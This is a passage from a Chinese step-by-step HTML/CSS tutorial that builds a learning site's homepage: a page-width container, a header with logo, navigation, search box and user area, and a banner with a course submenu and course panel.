<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/99a91c5fb66b464d8226c067f701c060~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg57OW57OWVEFORw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771502848&amp;x-signature=730LjsQnzJqNuJZ7sTTTP1KyOuI%3D" alt="image.png" loading="lazy"/>
通过浏览器预览网页再F12按键，若看到以下清除内外边距的内容，说明引入成功</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/84a3dd50aa134ed1aad0948ac88e8d3c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg57OW57OWVEFORw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771502848&amp;x-signature=WV2tDYF2doZ8wII6WryVEQVIKPI%3D" alt="image.png" loading="lazy"/></p>
<h2 data-id="heading-1">二.确定版心（页面宽度）</h2>
<p>每个版心都要水平居中，可以定义版心公共类；</p>
<p>样式文件添加：</p>
<pre><code class="hljs language-css" lang="css"><span class="hljs-selector-class">.w</span>{
    <span class="hljs-attribute">width</span>: <span class="hljs-number">1200px</span>;
    <span class="hljs-attribute">margin</span>: auto;
}
</code></pre>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/84c8857fd1e042eba74996ab10011008~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg57OW57OWVEFORw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771502848&amp;x-signature=Q%2FpBoOz%2Bsc2I2wTlDNdAydZmjJg%3D" alt="image.png" loading="lazy"/></p>
<h2 data-id="heading-2">三.分块实现</h2>
<p>接下来一行一行的实现，先写第一行的每一列，做完以后以此类推，在做第二行、第三行；</p>
<h3 data-id="heading-3">3.1头部制作</h3>
<h4 data-id="heading-4">3.1.1第一行盒子</h4>
<p>1.量头部内容高度和上下外边框高度；<br/>
2.在index.html文件的body里加入头部盒子代码，并引入之前的公共类.w；</p>
<pre><code class="hljs language-css" lang="css">  &lt;<span class="hljs-selector-tag">div</span> class="<span class="hljs-selector-tag">header</span> w"&gt;

  &lt;/<span class="hljs-selector-tag">div</span>&gt;
</code></pre>
<p>3.在style.css文件加入高度和外边距属性；</p>
<pre><code class="hljs language-css" lang="css"><span class="hljs-selector-class">.header</span>{
    <span class="hljs-attribute">height</span>: <span class="hljs-number">42px</span>;
    <span class="hljs-attribute">background-color</span>: pink;
    <span class="hljs-comment">/* 注意此地方会层叠.w 里面的margin，故要写左右的auto */</span>
    <span class="hljs-attribute">margin</span>: <span class="hljs-number">30px</span> auto;
}
</code></pre>
<h4 data-id="heading-5">3.1.2第一行第一列（logo部分）</h4>
<p>index.html的logo部分：</p>
<pre><code class="hljs language-xml" lang="xml">         <span class="hljs-comment">&lt;!-- logo部分 --&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"logo"</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"images/logo.png"</span> <span class="hljs-attr">alt</span>=<span class="hljs-string">""</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
</code></pre>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/442b361b5af0408890024503f46c0d54~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg57OW57OWVEFORw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771502848&amp;x-signature=ePH6ecBt9V6why8RU%2FJBS%2FQSLac%3D" alt="image.png" loading="lazy"/>
style.css的logo样式部分：</p>
<pre><code class="hljs language-css" lang="css"><span class="hljs-selector-class">.logo</span> {
    <span class="hljs-attribute">width</span>: <span class="hljs-number">198px</span>;
    <span class="hljs-attribute">height</span>: <span class="hljs-number">42px</span>;
    <span class="hljs-attribute">background-color</span>: purple;
}
</code></pre>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/81a293ff61eb4968ba706e2b13454396~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg57OW57OWVEFORw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771502848&amp;x-signature=FbxYt1Z75sHbcNn92VLfr0lTt%2Bs%3D" alt="image.png" loading="lazy"/></p>
<h4 data-id="heading-6">3.1.3第一行第二列（导航栏部分）</h4>
<p>实际开发中，我们不会直接用链接a而是用li包含链接（li+a)的做法。<br/>
原因：<br/>
1.li+a语义更清晰，一看这就是有条理的列表型内容。<br/>
2.如果直接用a，搜索引擎容易辨别为有堆砌关键词嫌疑从而影响网站排名</p>
<h5 data-id="heading-7">导航栏代码：</h5>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">ul</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"#"</span>&gt;</span>首页<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"#"</span>&gt;</span>课程<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"#"</span>&gt;</span>职业规划<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span>
</code></pre>
<h5 data-id="heading-8">样式代码：</h5>
<p>1.去掉li的小圆点</p>
<pre><code class="hljs language-css" lang="css"><span class="hljs-selector-tag">li</span>{
   <span class="hljs-attribute">list-style</span>: none;
}
</code></pre>
<p>2.注意当导航栏加浮动时，logo也要加上浮动</p>
<pre><code class="hljs language-css" lang="css"><span class="hljs-selector-class">.nav</span>{
    <span class="hljs-attribute">float</span>: left;
    <span class="hljs-attribute">margin-left</span>: <span class="hljs-number">60px</span>;
}
</code></pre>
<p>3.链接去掉下划线</p>
<pre><code class="hljs language-css" lang="css"><span class="hljs-selector-tag">a</span> {
    <span class="hljs-attribute">text-decoration</span>: none;
}
</code></pre>
<p>4.让导航栏里的内容横向排列，因为li是块状元素需要一行显示，加浮动</p>
<pre><code class="hljs language-css" lang="css"><span class="hljs-selector-class">.nav</span> <span class="hljs-selector-tag">ul</span> <span class="hljs-selector-tag">li</span> {
    <span class="hljs-attribute">float</span>: left;
}
</code></pre>
<p>5.链接样式：转为行内块元素才能调整高度，设置内边距、行高、字符大小、颜色</p>
<pre><code class="hljs language-css" lang="css"><span class="hljs-selector-class">.nav</span> <span class="hljs-selector-tag">ul</span> <span class="hljs-selector-tag">li</span> <span class="hljs-selector-tag">a</span> {
    <span class="hljs-attribute">display</span>: block;
    <span class="hljs-attribute">height</span>: <span class="hljs-number">42px</span>;
    <span class="hljs-attribute">padding</span>: <span class="hljs-number">0</span> <span class="hljs-number">10px</span>;
    <span class="hljs-attribute">line-height</span>: <span class="hljs-number">42px</span>;
    <span class="hljs-attribute">font-size</span>: <span class="hljs-number">18px</span>;
    <span class="hljs-attribute">color</span>: <span class="hljs-number">#050505</span>;

}
</code></pre>
<p>注意：</p>
<p>这个nav导航栏可以不加宽度，将来可以加其余文字；<br/>
因为导航栏里面文字不够多，所以最好给链接a左右内边距padding撑开盒子，而不是指定宽度。<br/></p>
<p>6.鼠标经过链接的样式代码</p>
<pre><code class="hljs language-css" lang="css"><span class="hljs-selector-class">.nav</span> <span class="hljs-selector-tag">ul</span> <span class="hljs-selector-tag">li</span> <span class="hljs-selector-tag">a</span> {
    <span class="hljs-attribute">display</span>: block;
    <span class="hljs-attribute">height</span>: <span class="hljs-number">42px</span>;
    <span class="hljs-attribute">padding</span>: <span class="hljs-number">0</span> <span class="hljs-number">10px</span>;
    <span class="hljs-attribute">line-height</span>: <span class="hljs-number">42px</span>;
    <span class="hljs-attribute">font-size</span>: <span class="hljs-number">18px</span>;
    <span class="hljs-attribute">color</span>: <span class="hljs-number">#050505</span>;

}
</code></pre>
<h5 data-id="heading-9">效果图</h5>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f51138e5bcea401a911be2def9eb09da~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg57OW57OWVEFORw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771502848&amp;x-signature=YaHEGQLJ6rxjcjcWzA%2BGGMNOywk%3D" alt="image.png" loading="lazy"/></p>
<h3 data-id="heading-10">3.1.4第一行第三列（search搜索模块）</h3>
<h4 data-id="heading-11">1.结构分析</h4>
<p>一个search大盒子里面包括两个表单=input文本框+button按钮</p>
<pre><code class="hljs language-xml" lang="xml">   <span class="hljs-comment">&lt;!-- 搜索模块 --&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"search"</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"text"</span> <span class="hljs-attr">value</span>=<span class="hljs-string">"输入关键词"</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">button</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
</code></pre>
<h4 data-id="heading-12">2.样式代码实现</h4>
<h5 data-id="heading-13">搜索框部分</h5>
<p>style.css</p>
<pre><code class="hljs language-css" lang="css"><span class="hljs-comment">/* search搜索模块 */</span>
<span class="hljs-selector-class">.search</span> {
    <span class="hljs-attribute">float</span>: left;
    <span class="hljs-attribute">width</span>: <span class="hljs-number">412px</span>;
    <span class="hljs-attribute">height</span>: <span class="hljs-number">42px</span>;
    <span class="hljs-attribute">background-color</span>: skyblue;
    <span class="hljs-attribute">margin-left</span>: <span class="hljs-number">70px</span>;
}

<span class="hljs-selector-class">.search</span> <span class="hljs-selector-tag">input</span> {
    <span class="hljs-attribute">width</span>: <span class="hljs-number">345px</span>;
    <span class="hljs-attribute">height</span>: <span class="hljs-number">40px</span>;
    <span class="hljs-attribute">border</span>: <span class="hljs-number">1px</span> solid <span class="hljs-number">#00a4ff</span>;
    <span class="hljs-attribute">border-right</span>: <span class="hljs-number">0</span>;
    <span class="hljs-attribute">color</span>: <span class="hljs-number">#bfbfbf</span>;
    <span class="hljs-attribute">font-size</span>: <span class="hljs-number">14px</span>;
    <span class="hljs-attribute">padding-left</span>: <span class="hljs-number">15px</span>;
}
</code></pre>
<p>注意：
加上左内边距后，盒子会被撑大，在宽度减去左内边距360-15=345</p>
<h5 data-id="heading-14">按钮部分</h5>
<pre><code class="hljs language-css" lang="css"><span class="hljs-selector-class">.search</span> <span class="hljs-selector-tag">button</span> {
    <span class="hljs-attribute">float</span>: left;
    <span class="hljs-attribute">width</span>: <span class="hljs-number">50px</span>;
    <span class="hljs-attribute">height</span>: <span class="hljs-number">42px</span>;
    <span class="hljs-attribute">background</span>: <span class="hljs-built_in">url</span>(<span class="hljs-string">images/btn.png</span>);
    <span class="hljs-comment">/* 按钮button默认有个边框需要我们手动去掉 */</span>
    <span class="hljs-attribute">border</span>: <span class="hljs-number">0</span>;
}
</code></pre>
<p>注意：
去掉按钮默认边框；
使按钮在搜索框右边则加上浮动，此时搜索框也要加上浮动。</p>
<h4 data-id="heading-15">效果图</h4>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/414759b22eab47c38896a5c3d35b9801~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg57OW57OWVEFORw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771502848&amp;x-signature=TL1fejAKWX283BYbn59drXPZSas%3D" alt="image.png" loading="lazy"/></p>
<h3 data-id="heading-16">3.1.5第一行第四列（用户user模块制作）</h3>
<p>1.用一个盒子装用户头像和用户名</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-comment">&lt;!-- 用户模块 --&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"user"</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"images/user.png"</span> <span class="hljs-attr">alt</span>=<span class="hljs-string">""</span>&gt;</span>
            qq-lilei
        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
</code></pre>
<p>2.样式：右浮动、行高、右外边距、字体大小、颜色</p>
<pre><code class="hljs language-css" lang="css"><span class="hljs-comment">/* 用户模块 */</span>
<span class="hljs-selector-class">.user</span> {
    <span class="hljs-attribute">float</span>: right;
    <span class="hljs-attribute">line-height</span>: <span class="hljs-number">42px</span>;
    <span class="hljs-attribute">margin-right</span>: <span class="hljs-number">30px</span>;
    <span class="hljs-attribute">font-style</span>: <span class="hljs-number">14px</span>;
    <span class="hljs-attribute">color</span>: <span class="hljs-number">#666</span>;
}
</code></pre>
<p>##背景色
1.设置整个页面背景色</p>
<pre><code class="hljs language-css" lang="css"><span class="hljs-selector-tag">body</span> {
    <span class="hljs-attribute">background-color</span>: <span class="hljs-number">#f3f5f7</span>;
}
</code></pre>
<p>2.去掉头部辅助的背景色</p>
<h5 data-id="heading-17">头部模块效果图</h5>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1ddcbe7655fd48de90d525d02610a70b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg57OW57OWVEFORw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771502848&amp;x-signature=NszG22ul6WmKidbRGB2fVupXaPI%3D" alt="image.png" loading="lazy"/></p>
<h3 data-id="heading-18">3.2 banner制作</h3>
<h4 data-id="heading-19">思路</h4>
<p>大盒子banner里包含版心.w，版心里有左右两个子盒子。<br/>
左边盒子用ul&gt;li&gt;a span,大于符号用&gt;<br/>
右边盒子用一个标题h4+ul&gt;li*3+一个a链接<br/>
其中li里面有h4和p<br/></p>
<h4 data-id="heading-20">代码实现</h4>
<pre><code class="hljs language-xml" lang="xml">  <span class="hljs-comment">&lt;!-- banner部分start --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"banner"</span>&gt;</span>
        <span class="hljs-comment">&lt;!-- 版心 左子盒子--&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"w"</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"subnav"</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">ul</span>&gt;</span>
                    <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"#"</span>&gt;</span>前端开发<span class="hljs-tag">&lt;<span class="hljs-name">span</span>&gt;</span><span class="hljs-symbol">&amp;gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span>
                    <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"#"</span>&gt;</span>后端开发<span class="hljs-tag">&lt;<span class="hljs-name">span</span>&gt;</span><span class="hljs-symbol">&amp;gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span>
                    <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"#"</span>&gt;</span>移动开发<span class="hljs-tag">&lt;<span class="hljs-name">span</span>&gt;</span><span class="hljs-symbol">&amp;gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span>
                    <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"#"</span>&gt;</span>人工智能<span class="hljs-tag">&lt;<span class="hljs-name">span</span>&gt;</span><span class="hljs-symbol">&amp;gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span>
                    <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"#"</span>&gt;</span>商业预测<span class="hljs-tag">&lt;<span class="hljs-name">span</span>&gt;</span><span class="hljs-symbol">&amp;gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span>
                    <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"#"</span>&gt;</span>云计算&amp;大数据<span class="hljs-tag">&lt;<span class="hljs-name">span</span>&gt;</span><span class="hljs-symbol">&amp;gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span>
                    <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"#"</span>&gt;</span>运维&amp;从测试<span class="hljs-tag">&lt;<span class="hljs-name">span</span>&gt;</span><span class="hljs-symbol">&amp;gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span>
                    <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"#"</span>&gt;</span>UI设计<span class="hljs-tag">&lt;<span class="hljs-name">span</span>&gt;</span><span class="hljs-symbol">&amp;gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span>
                    <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"#"</span>&gt;</span>产品<span class="hljs-tag">&lt;<span class="hljs-name">span</span>&gt;</span><span class="hljs-symbol">&amp;gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span>
                <span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span>
            <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
            
            <span class="hljs-comment">&lt;!--我的课程表  右子盒子 --&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"course"</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>我的课程表<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"bd"</span>&gt;</span>
                    <span class="hljs-tag">&lt;<span class="hljs-name">ul</span>&gt;</span>
                        <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span>
                            <span class="hljs-tag">&lt;<span class="hljs-name">h4</span>&gt;</span>继续学习 程序语言设计<span class="hljs-tag">&lt;/<span class="hljs-name">h4</span>&gt;</span>
                            <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>正在学习-使用对象<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
                        <span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span>
                        <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span>
                            <span class="hljs-tag">&lt;<span class="hljs-name">h4</span>&gt;</span>继续学习 程序语言设计<span class="hljs-tag">&lt;/<span class="hljs-name">h4</span>&gt;</span>
                            <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>正在学习-使用对象<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
                        <span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span>
                        <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span>
                            <span class="hljs-tag">&lt;<span class="hljs-name">h4</span>&gt;</span>继续学习 程序语言设计<span class="hljs-tag">&lt;/<span class="hljs-name">h4</span>&gt;</span>
                            <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>正在学习-使用对象<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
                        <span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span>
                    <span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span>
                    <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"#"</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"more"</span>&gt;</span>全部课程<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>
                <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
            <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
    <span class="hljs-comment">&lt;!-- banner部分end --&gt;</span>
</code></pre>
<h4 data-id="heading-21">样式代码</h4>
<pre><code class="hljs language-css" lang="css"><span class="hljs-comment">/* banner区域 */</span>
<span class="hljs-selector-class">.banner</span> {
    <span class="hljs-attribute">height</span>: <span class="hljs-number">421px</span>;
    <span class="hljs-attribute">background-color</span>: <span class="hljs-number">#1c036c</span>;
}

<span class="hljs-selector-class">.banner</span> <span class="hljs-selector-class">.w</span> {
    <span class="hljs-attribute">height</span>: <span class="hljs-number">421px</span>;
    <span class="hljs-attribute">background</span>: <span class="hljs-built_in">url</span>(<span class="hljs-string">images/banner2.png</span>) no-repeat top center;
}

<span class="hljs-selector-class">.subnav</span> {
    <span class="hljs-attribute">float</span>: left;
    <span class="hljs-attribute">width</span>: <span class="hljs-number">190px</span>;
    <span class="hljs-attribute">height</span>: <span class="hljs-number">421px</span>;
    <span class="hljs-attribute">background-color</span>: <span class="hljs-built_in">rgba</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0.3</span>);
}

<span class="hljs-selector-class">.subnav</span> <span class="hljs-selector-tag">ul</span> <span class="hljs-selector-tag">li</span> {
    <span class="hljs-attribute">height</span>: <span class="hljs-number">45px</span>;
    <span class="hljs-attribute">line-height</span>: <span class="hljs-number">45px</span>;
    <span class="hljs-attribute">padding</span>: <span class="hljs-number">0px</span> <span class="hljs-number">20px</span>;


}

<span class="hljs-selector-class">.subnav</span> <span class="hljs-selector-tag">ul</span> <span class="hljs-selector-tag">li</span> <span class="hljs-selector-tag">a</span> {
    <span class="hljs-attribute">font-style</span>: <span class="hljs-number">14px</span>;
    <span class="hljs-attribute">color</span>: <span class="hljs-number">#fff</span>;

}

<span class="hljs-selector-class">.subnav</span> <span class="hljs-selector-tag">ul</span> <span class="hljs-selector-tag">li</span> <span class="hljs-selector-tag">a</span> <span class="hljs-selector-tag">span</span> {
    <span class="hljs-attribute">float</span>: right;
    <span class="hljs-attribute">padding-right</span>: <span class="hljs-number">20px</span>;
}

<span class="hljs-selector-class">.subnav</span> <span class="hljs-selector-tag">ul</span> <span class="hljs-selector-tag">li</span> <span class="hljs-selector-tag">a</span><span class="hljs-selector-pseudo">:hover</span> {
    <span class="hljs-attribute">color</span>: <span class="hljs-number">#00a4ff</span>;
}

<span class="hljs-selector-class">.course</span> {
    <span class="hljs-attribute">float</span>: right;
    <span class="hljs-attribute">width</span>: <span class="hljs-number">230px</span>;
    <span class="hljs-attribute">height</span>: <span class="hljs-number">300px</span>;
    <span class="hljs-attribute">background-color</span>: <span class="hljs-number">#fff</span>;
    <span class="hljs-comment">/* 浮动的盒子不会有外边距合并的问题 */</span>
    <span class="hljs-attribute">margin-top</span>: <span class="hljs-number">50px</span>;
}

<span class="hljs-selector-class">.course</span> <span class="hljs-selector-tag">h2</span> {
    <span class="hljs-attribute">height</span>: <span class="hljs-number">48px</span>;
    <span class="hljs-attribute">background-color</span>: <span class="hljs-number">#9bceea</span>;
    <span class="hljs-attribute">text-align</span>: center;
    <span class="hljs-attribute">line-height</span>: <span class="hljs-number">48px</span>;
    <span class="hljs-attribute">font-size</span>: <span class="hljs-number">18px</span>;
    <span class="hljs-attribute">color</span>: <span class="hljs-number">#fff</span>;
}

<span class="hljs-selector-class">.bd</span>{
    <span class="hljs-attribute">padding</span>: <span class="hljs-number">0</span> <span class="hljs-number">20px</span>;
}

<span class="hljs-selector-class">.bd</span> <span class="hljs-selector-tag">ul</span> <span class="hljs-selector-tag">li</span>{
    <span class="hljs-attribute">padding</span>: <span class="hljs-number">15px</span> <span class="hljs-number">0</span>;
    <span class="hljs-attribute">border-bottom</span>: <span class="hljs-number">1px</span> solid <span class="hljs-number">#ccc</span>;
}
<span class="hljs-selector-class">.bd</span> <span class="hljs-selector-tag">ul</span> <span class="hljs-selector-tag">li</span> <span class="hljs-selector-tag">h4</span>{
    <span class="hljs-attribute">font-size</span>: <span class="hljs-number">16px</span>;
    <span class="hljs-attribute">color</span>: <span class="hljs-number">#4e4e4e</span>;
}

<span class="hljs-selector-class">.bd</span> <span class="hljs-selector-tag">ul</span> <span class="hljs-selector-tag">li</span> <span class="hljs-selector-tag">p</span> {
    <span class="hljs-attribute">font-size</span>: <span class="hljs-number">12px</span>;
    <span class="hljs-attribute">color</span>: <span class="hljs-number">#a5a5a5</span>;
}
<span class="hljs-selector-class">.bd</span> <span class="hljs-selector-class">.more</span>{
    <span class="hljs-attribute">display</span>:block;
    <span class="hljs-attribute">height</span>: <span class="hljs-number">38px</span>;
    <span class="hljs-attribute">border</span>: <span class="hljs-number">1px</span> solid <span class="hljs-number">#00a4ff</span>;
    <span class="hljs-attribute">text-align</span>: center;
    <span class="hljs-attribute">line-height</span>: <span class="hljs-number">38px</span>;
    <span class="hljs-attribute">color</span>:<span class="hljs-number">#00a4ff</span>;
    <span class="hljs-attribute">font</span>: size <span class="hljs-number">16px</span>;
    <span class="hljs-attribute">font-weight</span>: <span class="hljs-number">700</span>;
}
</code></pre>
<h4 data-id="heading-22">banner模块效果图</h4>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/250bcd0313654f80a67b4e48c205586a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg57OW57OWVEFORw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771502848&amp;x-signature=k7r%2BolRnLcjw1rMncXsVFlqgyqU%3D" alt="image.png" loading="lazy"/></p>
<h3 data-id="heading-23">3.3精品推荐小模块</h3>
<h4 data-id="heading-24">思路</h4>
<p>大盒子水平居中goods精品，注意此处有个盒子阴影。<br/>
大盒子里面有三个小盒子，一号盒子是标题h3左侧浮动，二号盒子里面放链接左侧浮动，goods-item距离可以控制连接的左右边距（注意行内元素只给左右内外边距），三号盒子右浮动mod修改</p>
<h4 data-id="heading-25">代码实现</h4>
<pre><code class="hljs language-xml" lang="xml">  <span class="hljs-comment">&lt;!--3. 精品推荐模块开始 --&gt;</span>
